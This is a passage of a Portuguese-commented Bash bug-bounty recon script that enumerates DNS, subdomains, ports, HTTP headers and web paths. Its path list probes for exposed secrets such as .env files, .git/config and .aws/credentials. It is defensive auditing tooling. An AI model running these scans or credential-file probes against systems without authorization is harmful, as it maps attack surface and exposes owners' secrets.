#!/usr/bin/env bash
# =============================================================================
#  BugBountyKit v3.0 — Ferramenta Completa de Bug Bounty em Bash
#  Autor  : kaltel | uso exclusivo em alvos com autorização explícita
#  Licença: Para fins educacionais e de pesquisa de segurança autorizada
# =============================================================================

set -euo pipefail

# ──────────────────────────────────────────────────────────────────────────────
# CONSTANTES E CONFIGURAÇÃO
# ──────────────────────────────────────────────────────────────────────────────
readonly VERSION="3.0"
readonly SCRIPT_NAME="BugBountyKit"
readonly SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
readonly TIMESTAMP="$(date +%Y%m%d_%H%M%S)"
OUTDIR="${SCRIPT_DIR}/bbk_results"
LOGLEVEL="INFO"   # DEBUG | INFO | WARN | ERROR
THREADS=10
TIMEOUT=10
USER_AGENT="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 BugBountyKit/${VERSION}"
RATE_LIMIT=100    # ms entre requisições
SCOPE_FILE=""
WORDLIST_DIRS="/usr/share/wordlists/dirb /usr/share/seclists /opt/SecLists"
TARGET=""
DOMAIN=""
SEVERITY_COUNT_CRITICAL=0
SEVERITY_COUNT_HIGH=0
SEVERITY_COUNT_MEDIUM=0
SEVERITY_COUNT_LOW=0
SEVERITY_COUNT_INFO=0
declare -a FINDINGS_LIST=()
REPORT_HTML=true
REPORT_JSON=true

# ──────────────────────────────────────────────────────────────────────────────
# PALETA DE CORES
# ──────────────────────────────────────────────────────────────────────────────
RED='\033[0;31m';   LRED='\033[1;31m'
GREEN='\033[0;32m'; LGREEN='\033[1;32m'
YELLOW='\033[1;33m';CYAN='\033[0;36m'
BLUE='\033[0;34m';  MAGENTA='\033[0;35m'
WHITE='\033[1;37m'; GRAY='\033[0;90m'
BOLD='\033[1m';     DIM='\033[2m'
RESET='\033[0m'

# ──────────────────────────────────────────────────────────────────────────────
# LOGGING
# ──────────────────────────────────────────────────────────────────────────────
_log() {
    local level="$1"; shift
    local msg="$*"
    local ts; ts="$(date '+%H:%M:%S')"
    local logfile="${OUTDIR}/bbk_${TIMESTAMP}.log"
    case "$level" in
        INFO)  echo -e "${GRAY}[${ts}]${RESET} ${GREEN}[INFO]${RESET}  ${msg}" ;;
        WARN)  echo -e "${GRAY}[${ts}]${RESET} ${YELLOW}[WARN]${RESET}  ${msg}" ;;
        ERROR) echo -e "${GRAY}[${ts}]${RESET} ${LRED}[ERROR]${RESET} ${msg}" ;;
        DEBUG) [[ "$LOGLEVEL" == "DEBUG" ]] && \
               echo -e "${GRAY}[${ts}] [DEBUG] ${msg}${RESET}" ;;
        FIND)  echo -e "${GRAY}[${ts}]${RESET} ${LGREEN}[FIND]${RESET}  ${msg}" ;;
        VULN)  echo -e "${GRAY}[${ts}]${RESET} ${LRED}[VULN]${RESET}  ${BOLD}${msg}${RESET}" ;;
        SECT)  echo -e "\n${CYAN}${BOLD}━━━  ${msg}  ━━━${RESET}" ;;
    esac
    # Salvar no log sem cores
    if [[ -d "$OUTDIR" ]]; then
        echo "[${ts}] [${level}] ${msg}" >> "$logfile" 2>/dev/null || true
    fi
}

log_info()  { _log INFO  "$@"; }
log_warn()  { _log WARN  "$@"; }
log_error() { _log ERROR "$@"; }
log_debug() { _log DEBUG "$@"; }
log_find()  { _log FIND  "$@"; }
log_vuln()  { _log VULN  "$@"; }
log_sect()  { _log SECT  "$@"; }

# ──────────────────────────────────────────────────────────────────────────────
# SEVERITY TRACKER — Rastreia findings com nível CVSS
# ──────────────────────────────────────────────────────────────────────────────
# Uso: add_finding CRITICAL|HIGH|MEDIUM|LOW|INFO "Título" "Descrição" "módulo"
add_finding() {
    local sev="$1" title="$2" desc="$3" mod="${4:-geral}"
    case "$sev" in
        CRITICAL) ((SEVERITY_COUNT_CRITICAL++)) ;;
        HIGH)     ((SEVERITY_COUNT_HIGH++)) ;;
        MEDIUM)   ((SEVERITY_COUNT_MEDIUM++)) ;;
        LOW)      ((SEVERITY_COUNT_LOW++)) ;;
        INFO)     ((SEVERITY_COUNT_INFO++)) ;;
    esac
    FINDINGS_LIST+=("${sev}|||${title}|||${desc}|||${mod}")
    local color
    case "$sev" in
        CRITICAL) color="$LRED" ;;
        HIGH)     color="$RED" ;;
        MEDIUM)   color="$YELLOW" ;;
        LOW)      color="$BLUE" ;;
        INFO)     color="$GRAY" ;;
    esac
    _log VULN "${color}[${sev}]${RESET} ${title}"
}

# ──────────────────────────────────────────────────────────────────────────────
# BANNER
# ──────────────────────────────────────────────────────────────────────────────
banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << 'EOF'
  ██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗
  ██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝
  ██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝ 
  ██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝  
  ██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║   
  ╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝  
                         ██╗  ██╗██╗████████╗                                          
                         ██║ ██╔╝██║╚══██╔══╝                                          
                         █████╔╝ ██║   ██║                                             
                         ██╔═██╗ ██║   ██║                                             
                         ██║  ██╗██║   ██║                                             
                         ╚═╝  ╚═╝╚═╝   ╚═╝                                             
EOF
    echo -e "${RESET}"
    echo -e "  ${WHITE}${BOLD}BugBountyKit v${VERSION}${RESET}  ${DIM}— Plataforma de Bug Bounty em Bash${RESET}"
    echo -e "  ${GRAY}Use apenas em alvos com autorização explícita por escrito${RESET}"
    echo -e "  ${GRAY}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"
}

# ──────────────────────────────────────────────────────────────────────────────
# UTILITÁRIOS
# ──────────────────────────────────────────────────────────────────────────────
check_cmd() {
    command -v "$1" &>/dev/null
}

require_cmd() {
    if ! check_cmd "$1"; then
        log_error "Dependência ausente: ${BOLD}$1${RESET}. Instale com: apt install $1"
        return 1
    fi
    return 0
}

http_get() {
    local url="$1"; shift
    local extra_args=("$@")
    curl -s -L \
        --max-time "$TIMEOUT" \
        -A "$USER_AGENT" \
        -H "Accept: */*" \
        "${extra_args[@]}" \
        "$url" 2>/dev/null
}

http_head() {
    curl -s -I -L \
        --max-time "$TIMEOUT" \
        -A "$USER_AGENT" \
        "$1" 2>/dev/null
}

http_status() {
    curl -s -o /dev/null -w "%{http_code}" -L \
        --max-time "$TIMEOUT" \
        -A "$USER_AGENT" \
        "$1" 2>/dev/null
}

# Resolve IP de um host
resolve_ip() {
    local host="$1"
    if check_cmd dig; then
        dig +short "$host" A 2>/dev/null | grep -E '^[0-9]+\.' | head -1
    elif check_cmd host; then
        host "$host" 2>/dev/null | awk '/has address/{print $4}' | head -1
    else
        getent hosts "$host" 2>/dev/null | awk '{print $1}' | head -1
    fi
}

# Extrair domínio base de URL
extract_domain() {
    local url="$1"
    echo "$url" | sed -E 's|https?://||' | sed -E 's|/.*||' | sed -E 's|:.*||'
}

# Criar diretório de saída para o alvo
mk_outdir() {
    local target_dir="${OUTDIR}/${DOMAIN}_${TIMESTAMP}"
    mkdir -p "$target_dir"/{recon,subdomains,ports,web,vulns,reports}
    echo "$target_dir"
}

# Barra de progresso simples
progress() {
    local current="$1" total="$2" label="${3:-}"
    local pct=$(( current * 100 / total ))
    local filled=$(( pct / 5 ))
    local bar=""
    for ((i=0; i<20; i++)); do
        if (( i < filled )); then bar+="█"; else bar+="░"; fi
    done
    printf "\r  ${CYAN}[${bar}]${RESET} ${WHITE}%3d%%${RESET} %s" "$pct" "$label"
}

# Delay entre requisições (rate limiting)
rate_sleep() {
    sleep "0.${RATE_LIMIT}" 2>/dev/null || sleep 0.1
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 1 — RECONHECIMENTO WHOIS / IP / GEO
# ──────────────────────────────────────────────────────────────────────────────
module_whois() {
    local tdir="$1"
    log_sect "MÓDULO: WHOIS / IP / GEOLOCALIZAÇÃO"

    local ip; ip="$(resolve_ip "$DOMAIN")"
    log_info "Domínio  : ${WHITE}${DOMAIN}${RESET}"
    log_info "IP       : ${WHITE}${ip:-Não resolvido}${RESET}"

    # WHOIS
    if check_cmd whois; then
        log_info "Executando WHOIS..."
        local whois_out; whois_out="$(whois "$DOMAIN" 2>/dev/null)"
        echo "$whois_out" > "${tdir}/recon/whois.txt"

        # Extrair campos relevantes
        local registrar;  registrar="$(echo "$whois_out"  | grep -iE 'registrar:' | head -1 | cut -d: -f2- | xargs)"
        local created;    created="$(echo "$whois_out"    | grep -iE 'creation|created' | head -1 | cut -d: -f2- | xargs)"
        local expires;    expires="$(echo "$whois_out"    | grep -iE 'expir' | head -1 | cut -d: -f2- | xargs)"
        local nameserver; nameserver="$(echo "$whois_out" | grep -iE 'name server' | awk '{print $NF}' | tr '\n' ' ')"
        local emails;     emails="$(echo "$whois_out"     | grep -iEo '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' | sort -u)"

        [[ -n "$registrar"  ]] && log_find "Registrar  : $registrar"
        [[ -n "$created"    ]] && log_find "Criado em  : $created"
        [[ -n "$expires"    ]] && log_find "Expira em  : $expires"
        [[ -n "$nameserver" ]] && log_find "Nameservers: $nameserver"
        if [[ -n "$emails" ]]; then
            log_find "Emails WHOIS encontrados:"
            echo "$emails" | while read -r em; do
                echo -e "            ${LGREEN}→${RESET} $em"
                echo "EMAIL: $em" >> "${tdir}/recon/emails.txt"
            done
        fi
    fi

    # GeoIP via ip-api.com
    if [[ -n "${ip:-}" ]]; then
        log_info "Consultando geolocalização do IP ${ip}..."
        local geo; geo="$(http_get "http://ip-api.com/json/${ip}")"
        if [[ -n "$geo" ]]; then
            echo "$geo" > "${tdir}/recon/geoip.json"
            local country city isp org asn
            country="$(echo "$geo" | grep -o '"country":"[^"]*"' | cut -d'"' -f4)"
            city="$(echo "$geo"    | grep -o '"city":"[^"]*"'    | cut -d'"' -f4)"
            isp="$(echo "$geo"     | grep -o '"isp":"[^"]*"'     | cut -d'"' -f4)"
            org="$(echo "$geo"     | grep -o '"org":"[^"]*"'     | cut -d'"' -f4)"
            asn="$(echo "$geo"     | grep -o '"as":"[^"]*"'      | cut -d'"' -f4)"
            log_find "País     : ${country} / ${city}"
            log_find "ISP      : ${isp}"
            log_find "Org/ASN  : ${org} | ${asn}"
        fi
    fi

    # ASN Lookup (bgpview)
    if [[ -n "${ip:-}" ]]; then
        log_info "Buscando informações ASN..."
        local asn_data; asn_data="$(http_get "https://api.bgpview.io/ip/${ip}" 2>/dev/null)"
        if [[ -n "$asn_data" ]]; then
            echo "$asn_data" > "${tdir}/recon/asn.json"
            log_find "Dados ASN salvos em recon/asn.json"
        fi
    fi

    log_info "WHOIS/Recon concluído → ${tdir}/recon/"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 2 — ENUMERAÇÃO DNS
# ──────────────────────────────────────────────────────────────────────────────
module_dns() {
    local tdir="$1"
    log_sect "MÓDULO: ENUMERAÇÃO DNS"

    local dns_file="${tdir}/recon/dns_records.txt"
    : > "$dns_file"

    local record_types=("A" "AAAA" "MX" "NS" "TXT" "SOA" "CNAME" "CAA" "PTR" "SRV")

    for rtype in "${record_types[@]}"; do
        local result=""
        if check_cmd dig; then
            result="$(dig +noall +answer "$DOMAIN" "$rtype" 2>/dev/null)"
        elif check_cmd nslookup; then
            result="$(nslookup -type="$rtype" "$DOMAIN" 2>/dev/null | grep -v '^$')"
        fi
        if [[ -n "$result" ]]; then
            echo "=== $rtype ===" >> "$dns_file"
            echo "$result" >> "$dns_file"
            echo "" >> "$dns_file"
            log_find "DNS ${rtype}: $(echo "$result" | head -1 | awk '{print $NF}')"
        fi
    done

    # Verificar Zone Transfer (AXFR)
    log_info "Testando Zone Transfer (AXFR)..."
    local ns_list
    if check_cmd dig; then
        ns_list="$(dig +short NS "$DOMAIN" 2>/dev/null)"
    fi
    if [[ -n "${ns_list:-}" ]]; then
        while IFS= read -r ns; do
            local axfr_result; axfr_result="$(dig AXFR "$DOMAIN" @"$ns" 2>/dev/null)"
            if echo "$axfr_result" | grep -qv "Transfer failed\|NOTAUTH\|REFUSED"; then
                local record_count; record_count="$(echo "$axfr_result" | grep -c "IN" 2>/dev/null || echo 0)"
                if (( record_count > 5 )); then
                    log_vuln "ZONE TRANSFER POSSÍVEL via NS: ${ns} (${record_count} registros)"
                    echo "$axfr_result" > "${tdir}/recon/axfr_${ns}.txt"
                fi
            fi
        done <<< "$ns_list"
    fi

    # SPF / DMARC / DKIM análise
    log_info "Analisando configurações de e-mail (SPF/DMARC/DKIM)..."
    local spf_record; spf_record="$(dig +short TXT "$DOMAIN" 2>/dev/null | grep -i spf || true)"
    local dmarc_record; dmarc_record="$(dig +short TXT "_dmarc.${DOMAIN}" 2>/dev/null || true)"
    local dkim_record; dkim_record="$(dig +short TXT "default._domainkey.${DOMAIN}" 2>/dev/null || true)"

    if [[ -z "$spf_record" ]]; then
        log_vuln "SPF não configurado — domínio vulnerável a email spoofing!"
    else
        log_find "SPF: $spf_record"
    fi

    if [[ -z "$dmarc_record" ]]; then
        log_vuln "DMARC não configurado — sem proteção anti-spoofing!"
    else
        log_find "DMARC: $dmarc_record"
        if echo "$dmarc_record" | grep -qi "p=none"; then
            log_warn "DMARC em modo 'none' — monitoramento apenas, sem bloqueio"
        fi
    fi

    [[ -z "$dkim_record" ]] && log_warn "DKIM padrão não encontrado"

    log_info "DNS concluído → ${dns_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 3 — ENUMERAÇÃO DE SUBDOMÍNIOS
# ──────────────────────────────────────────────────────────────────────────────
module_subdomains() {
    local tdir="$1"
    log_sect "MÓDULO: ENUMERAÇÃO DE SUBDOMÍNIOS"

    local sub_file="${tdir}/subdomains/all_subdomains.txt"
    local live_file="${tdir}/subdomains/live_subdomains.txt"
    : > "$sub_file"
    : > "$live_file"

    # 1. Certificate Transparency (crt.sh)
    log_info "Consultando Certificate Transparency (crt.sh)..."
    local crt_data; crt_data="$(http_get "https://crt.sh/?q=%.${DOMAIN}&output=json" 2>/dev/null)"
    if [[ -n "$crt_data" ]]; then
        echo "$crt_data" | grep -oE '"name_value":"[^"]*"' | \
            cut -d'"' -f4 | \
            sed 's/\\n/\n/g' | \
            grep -E "\.${DOMAIN}$" | \
            grep -v '^\*' | \
            sort -u >> "$sub_file"
        local crt_count; crt_count="$(wc -l < "$sub_file")"
        log_find "crt.sh: ${crt_count} subdomínios encontrados"
    fi

    # 2. HackerTarget
    log_info "Consultando HackerTarget..."
    local ht_data; ht_data="$(http_get "https://api.hackertarget.com/hostsearch/?q=${DOMAIN}")"
    if [[ -n "$ht_data" ]] && ! echo "$ht_data" | grep -qi "error\|API count"; then
        echo "$ht_data" | cut -d',' -f1 | grep -E "\.${DOMAIN}$" | sort -u >> "$sub_file"
        log_find "HackerTarget: dados adicionados"
    fi

    # 3. AlienVault OTX
    log_info "Consultando AlienVault OTX..."
    local otx_data; otx_data="$(http_get "https://otx.alienvault.com/api/v1/indicators/domain/${DOMAIN}/passive_dns")"
    if [[ -n "$otx_data" ]]; then
        echo "$otx_data" | grep -oE '"hostname":"[^"]*"' | \
            cut -d'"' -f4 | \
            grep -E "\.${DOMAIN}$" | \
            sort -u >> "$sub_file"
        log_find "AlienVault OTX: dados adicionados"
    fi

    # 4. RapidDNS
    log_info "Consultando RapidDNS..."
    local rdns_data; rdns_data="$(http_get "https://rapiddns.io/subdomain/${DOMAIN}?full=1" 2>/dev/null)"
    if [[ -n "$rdns_data" ]]; then
        echo "$rdns_data" | grep -oE "[a-zA-Z0-9._-]+\.${DOMAIN}" | \
            sort -u >> "$sub_file"
        log_find "RapidDNS: dados adicionados"
    fi

    # 5. ThreatCrowd
    log_info "Consultando ThreatCrowd..."
    local tc_data; tc_data="$(http_get "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=${DOMAIN}")"
    if [[ -n "$tc_data" ]]; then
        echo "$tc_data" | grep -oE '"[a-zA-Z0-9._-]+\.'${DOMAIN}'"' | \
            tr -d '"' | sort -u >> "$sub_file"
        log_find "ThreatCrowd: dados adicionados"
    fi

    # 6. Brute-force com wordlist embutida
    log_info "Brute-force de subdomínios comuns..."
    local common_subs=(
        www mail ftp smtp pop pop3 imap webmail cpanel whm admin
        dev staging test api apis gateway cdn static assets img
        images media upload uploads download downloads files
        vpn remote rdp ssh citrix owa exchange outlook
        blog shop store forum support help desk kb docs
        app apps mobile wap m portal intranet extranet
        ns1 ns2 ns3 dns1 dns2 mx mx1 mx2 smtp1 smtp2
        git gitlab github svn repo repos jenkins ci cd
        jira confluence wiki backup db database mysql
        phpmyadmin pma adminer ldap ldaps ad sso auth
        login register signup account accounts profile
        qa uat prod production staging1 staging2 dev1 dev2
        sandbox beta alpha preview rc release
        monitor monitoring nagios zabbix grafana kibana
        elasticsearch solr redis memcache cache
        s3 storage blob object files assets
        payment pay billing invoice checkout cart
        crm erp hr sales marketing analytics data
        status statuspage health alive ping
        webdisk autoconfig autodiscover _dmarc
    )

    local wl_found=0
    for sub in "${common_subs[@]}"; do
        local full="${sub}.${DOMAIN}"
        local ip; ip="$(resolve_ip "$full" 2>/dev/null)"
        if [[ -n "$ip" ]]; then
            echo "$full" >> "$sub_file"
            log_find "Brute-force: ${LGREEN}${full}${RESET} → ${ip}"
            ((wl_found++))
        fi
        rate_sleep
    done
    log_info "Brute-force: ${wl_found} subdomínios encontrados"

    # Deduplicar lista final
    sort -u "$sub_file" -o "$sub_file"
    local total; total="$(wc -l < "$sub_file")"
    log_find "Total subdomínios únicos: ${WHITE}${total}${RESET}"

    # 7. Verificar quais estão ativos (HTTP)
    log_info "Verificando subdomínios ativos..."
    local alive=0
    while IFS= read -r sub; do
        [[ -z "$sub" ]] && continue
        for scheme in https http; do
            local code; code="$(http_status "${scheme}://${sub}" 2>/dev/null)"
            if [[ "$code" =~ ^[123456789][0-9][0-9]$ ]]; then
                echo "${scheme}://${sub} [${code}]" >> "$live_file"
                log_find "LIVE: ${LGREEN}${scheme}://${sub}${RESET} → HTTP ${code}"
                ((alive++))
                break
            fi
        done
        rate_sleep
    done < "$sub_file"

    log_info "Subdomínios ativos: ${WHITE}${alive}${RESET} → ${live_file}"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 4 — VARREDURA DE PORTAS
# ──────────────────────────────────────────────────────────────────────────────
module_ports() {
    local tdir="$1"
    log_sect "MÓDULO: VARREDURA DE PORTAS"

    local ip; ip="$(resolve_ip "$DOMAIN")"
    if [[ -z "$ip" ]]; then
        log_error "Não foi possível resolver IP do alvo"
        return 1
    fi

    local port_file="${tdir}/ports/scan.txt"
    local service_file="${tdir}/ports/services.txt"

    # Top 1000 portas via nmap
    if check_cmd nmap; then
        log_info "Nmap scan (top 1000 portas) em ${ip}..."
        nmap -sV -sC -O --open \
            -T4 \
            --version-intensity 5 \
            -oN "$port_file" \
            -oX "${tdir}/ports/scan.xml" \
            "$ip" 2>/dev/null || true
        log_find "Resultados nmap salvos em ports/scan.txt"

        # Extrair portas abertas
        local open_ports
        open_ports="$(grep "^[0-9]" "$port_file" 2>/dev/null | grep "open" || true)"
        if [[ -n "$open_ports" ]]; then
            echo "$open_ports" > "$service_file"
            local port_count; port_count="$(echo "$open_ports" | wc -l)"
            log_find "${port_count} porta(s) abertas encontradas"
            while IFS= read -r line; do
                log_find "  ${line}"
            done <<< "$open_ports"
        fi

        # Alertas por porta sensível
        local sensitive_ports=(21 22 23 25 53 69 80 110 111 135 139 143 443 445 \
                                512 513 514 873 1080 1433 1521 2049 2375 2376 \
                                3000 3306 3389 4848 5432 5900 5984 6379 7001 \
                                8080 8443 8888 9200 9300 27017 28017)

        for sp in "${sensitive_ports[@]}"; do
            if grep -q "^${sp}/tcp" "$port_file" 2>/dev/null; then
                local svc_name
                svc_name="$(grep "^${sp}/tcp" "$port_file" | awk '{print $3}')"
                log_vuln "Porta sensível aberta: ${sp}/tcp (${svc_name})"
            fi
        done
    else
        # Fallback: port scan via /dev/tcp (bash nativo)
        log_warn "nmap não disponível — usando scanner bash nativo..."
        local common_ports=(21 22 23 25 53 80 110 143 443 445 \
                             3306 3389 5432 5900 6379 8080 8443 27017)

        for port in "${common_ports[@]}"; do
            if timeout 3 bash -c "echo >/dev/tcp/${ip}/${port}" 2>/dev/null; then
                log_find "Porta aberta: ${ip}:${port}"
                echo "${port}/tcp open" >> "$port_file"
            fi
        done
        log_info "Scanner bash concluído"
    fi

    log_info "Varredura de portas concluída → ${tdir}/ports/"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 5 — FINGERPRINTING HTTP / HEADERS
# ──────────────────────────────────────────────────────────────────────────────
module_http_fingerprint() {
    local tdir="$1"
    log_sect "MÓDULO: FINGERPRINTING HTTP / HEADERS"

    local schemes=("https" "http")
    local web_file="${tdir}/web/http_info.txt"
    local headers_file="${tdir}/web/headers.txt"

    for scheme in "${schemes[@]}"; do
        local url="${scheme}://${DOMAIN}"
        log_info "Analisando ${url}..."

        # Headers completos
        local headers; headers="$(http_head "$url")"
        if [[ -n "$headers" ]]; then
            echo "=== ${url} ===" >> "$headers_file"
            echo "$headers" >> "$headers_file"
            echo "" >> "$headers_file"

            # Extrair tecnologias
            local server; server="$(echo "$headers" | grep -i '^server:' | cut -d' ' -f2- | tr -d '\r')"
            local powered; powered="$(echo "$headers" | grep -i 'X-Powered-By:' | cut -d' ' -f2- | tr -d '\r')"
            local framework; framework="$(echo "$headers" | grep -iE 'X-Generator:|X-Framework:|X-CMS:' | cut -d' ' -f2- | tr -d '\r')"
            local cookies; cookies="$(echo "$headers" | grep -i '^set-cookie:' | tr -d '\r')"

            [[ -n "$server"    ]] && log_find "Server     : ${server}"
            [[ -n "$powered"   ]] && log_find "X-Powered-By: ${powered}"
            [[ -n "$framework" ]] && log_find "Framework  : ${framework}"

            # ──── ANÁLISE DE SEGURANÇA DOS HEADERS ────
            log_info "Verificando Security Headers..."

            # Headers de segurança obrigatórios
            declare -A sec_headers=(
                ["Strict-Transport-Security"]="HSTS ausente — vulnerável a downgrade HTTPS"
                ["X-Frame-Options"]="X-Frame-Options ausente — vulnerável a Clickjacking"
                ["X-Content-Type-Options"]="X-Content-Type-Options ausente — MIME sniffing possível"
                ["X-XSS-Protection"]="X-XSS-Protection ausente"
                ["Content-Security-Policy"]="CSP ausente — risco de XSS/injection"
                ["Referrer-Policy"]="Referrer-Policy ausente — vazamento de dados de referência"
                ["Permissions-Policy"]="Permissions-Policy ausente — permissões de browser não restringidas"
            )

            for header in "${!sec_headers[@]}"; do
                if ! echo "$headers" | grep -qi "^${header}:"; then
                    log_vuln "${sec_headers[$header]}"
                    echo "MISSING_HEADER: $header" >> "${tdir}/vulns/missing_headers.txt"
                else
                    local hval; hval="$(echo "$headers" | grep -i "^${header}:" | cut -d' ' -f2- | tr -d '\r')"
                    log_find "Header OK: ${header} = ${hval}"
                fi
            done

            # CORS misconfiguration
            local cors_origin; cors_origin="$(echo "$headers" | grep -i 'Access-Control-Allow-Origin' | tr -d '\r')"
            if echo "$cors_origin" | grep -q '\*'; then
                log_vuln "CORS: Access-Control-Allow-Origin: * — permissivo demais"
            elif [[ -n "$cors_origin" ]]; then
                log_find "CORS: $cors_origin"
            fi

            # Cookies sem flags de segurança
            if [[ -n "$cookies" ]]; then
                while IFS= read -r cookie; do
                    local cname; cname="$(echo "$cookie" | sed 's/Set-Cookie: //i' | cut -d'=' -f1)"
                    if ! echo "$cookie" | grep -qi "httponly"; then
                        log_vuln "Cookie '${cname}' sem flag HttpOnly — risco XSS"
                    fi
                    if ! echo "$cookie" | grep -qi "secure"; then
                        log_vuln "Cookie '${cname}' sem flag Secure — transmissão HTTP possível"
                    fi
                    if ! echo "$cookie" | grep -qi "samesite"; then
                        log_warn "Cookie '${cname}' sem SameSite — risco CSRF"
                    fi
                done <<< "$cookies"
            fi

            # Informações sensíveis em headers
            if echo "$headers" | grep -qiE "X-AspNet-Version:|X-AspNetMvc-Version:"; then
                local aspver; aspver="$(echo "$headers" | grep -iE 'X-AspNet' | tr -d '\r')"
                log_vuln "Versão ASP.NET exposta: ${aspver}"
            fi

            # Redirect para HTTPS?
            if [[ "$scheme" == "http" ]]; then
                local status; status="$(http_status "$url")"
                if [[ "$status" == "200" ]]; then
                    log_warn "HTTP (sem redirect) responde 200 — HTTPS não forçado"
                fi
            fi

            break  # Pegar apenas o primeiro scheme funcional
        fi
    done

    # Detectar tecnologias pela página HTML
    log_info "Detectando tecnologias pela página HTML..."
    local html; html="$(http_get "https://${DOMAIN}" 2>/dev/null || http_get "http://${DOMAIN}")"
    if [[ -n "$html" ]]; then
        echo "$html" > "${tdir}/web/index.html"

        # WordPress
        if echo "$html" | grep -qiE "wp-content|wp-includes|wordpress"; then
            log_find "CMS detectado: ${YELLOW}WordPress${RESET}"
            local wp_ver; wp_ver="$(echo "$html" | grep -oE "WordPress [0-9.]+" | head -1)"
            [[ -n "$wp_ver" ]] && log_vuln "Versão WordPress exposta: ${wp_ver}"
        fi

        # Joomla
        echo "$html" | grep -qiE "/components/com_|joomla" && \
            log_find "CMS detectado: ${YELLOW}Joomla${RESET}"

        # Drupal
        echo "$html" | grep -qiE "Drupal|drupal.js|sites/default/files" && \
            log_find "CMS detectado: ${YELLOW}Drupal${RESET}"

        # React/Angular/Vue
        echo "$html" | grep -q "react" && log_find "Framework JS: React"
        echo "$html" | grep -q "ng-app\|angular" && log_find "Framework JS: Angular"
        echo "$html" | grep -q "__vue__\|data-v-" && log_find "Framework JS: Vue.js"

        # Títulos e meta
        local title; title="$(echo "$html" | grep -oi '<title>[^<]*</title>' | sed 's/<[^>]*>//g' | head -1)"
        [[ -n "$title" ]] && log_find "Título da página: ${title}"

        # Comentários HTML com info sensível
        local html_comments; html_comments="$(echo "$html" | grep -oE '<!--.*?-->' | grep -iE 'todo|fixme|hack|bug|password|debug|key|secret|api')"
        if [[ -n "$html_comments" ]]; then
            log_vuln "Comentários HTML com informação sensível encontrados!"
            echo "$html_comments" > "${tdir}/vulns/html_comments.txt"
        fi

        # Emails no HTML
        local html_emails; html_emails="$(echo "$html" | grep -oiE '[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}' | sort -u)"
        if [[ -n "$html_emails" ]]; then
            log_find "Emails na página:"
            echo "$html_emails" | while read -r em; do
                echo -e "  ${LGREEN}→${RESET} ${em}"
                echo "$em" >> "${tdir}/recon/emails.txt"
            done
        fi
    fi

    log_info "Fingerprinting HTTP concluído → ${tdir}/web/"
}

# ──────────────────────────────────────────────────────────────────────────────
# MÓDULO 6 — ENUMERAÇÃO DE DIRETÓRIOS E ARQUIVOS
# ──────────────────────────────────────────────────────────────────────────────
module_dirbusting() {
    local tdir="$1"
    log_sect "MÓDULO: ENUMERAÇÃO DE DIRETÓRIOS / ARQUIVOS"

    local base_url="https://${DOMAIN}"
    local status; status="$(http_status "$base_url")"
    [[ "$status" == "000" ]] && base_url="http://${DOMAIN}"

    local dir_file="${tdir}/web/directories.txt"
    : > "$dir_file"

    # Wordlist embutida (comum em bug bounty)
    local paths=(
        # Admin / painéis
        admin admin/ administrator/ admin.php admin.html
        wp-admin/ cpanel/ phpmyadmin/ pma/ adminer.php
        manager/ management/ panel/ controlpanel/
        dashboard/ backend/ cms/

        # Auth
        login login.php login.html signin sign-in
        register signup sign-up forgot-password reset-password
        logout auth/ oauth/ sso/

        # API
        api/ api/v1/ api/v2/ api/v3/ api/v1/users
        api/v1/admin api/v1/login graphql graphiql
        swagger swagger.json swagger.yaml openapi.json
        api-docs/ docs/ documentation/

        # Arquivos sensíveis
        .env .env.local .env.production .env.backup
        .git/HEAD .git/config .git/FETCH_HEAD
        .gitignore .htaccess .htpasswd
        robots.txt sitemap.xml security.txt
        crossdomain.xml clientaccesspolicy.xml

        # Backup / config
        config.php config.yml config.json config.ini
        settings.php settings.py settings.js
        database.yml db.php wp-config.php
        backup.sql backup.zip backup.tar.gz
        dump.sql data.sql install.sql

        # Logs / debug
        error.log access.log debug.log app.log
        logs/ log/ phpinfo.php info.php test.php
        debug/ trace/

        # Uploads / media
        uploads/ upload/ files/ images/ img/
        media/ assets/ static/ public/ dist/
        tmp/ temp/ cache/

        # Framework-specific
        wp-login.php xmlrpc.php wp-json/wp/v2/users
        joomla/ administrator/index.php
        drupal/ user/login node/1
        .well-known/ .well-known/security.txt
        actuator/ actuator/health actuator/env
        console/ h2-console/ solr/ axis2/

        # Cloud / DevOps
        .aws/ .aws/credentials
        Dockerfile docker-compose.yml
        Jenkinsfile .travis.yml .circleci/config.yml
        kubernetes.yaml k8s/ terraform/
    )

    log_info "Testando ${#paths[@]} caminhos em ${base_url}..."
    local found=0 tested=0

    for path in "${paths[@]}"; do
        local url="${base_url}/${path}"
        local code; code="$(http_status "$url")"
        ((tested++))

        case "$code" in
            200)
                log_find "HTTP 200: ${LGREEN}${url}${RESET}"
                echo "200 $url" >> "$dir_file"
                ((found++))
                ;;
            301|302|307|308)
                log_find "REDIRECT ${code}: ${CYAN}${url}${RESET}"
                echo "$code $url" >> "$dir_file"
                ;;
            401|403)
                echo -e "  ${YELLOW}[${code}]${RESET} ${url}" 
                echo "$code $url" >> "$dir_file"
                ;;
        esac

        # Alertas especiais
        case "$path" in
            .env*|*.env)
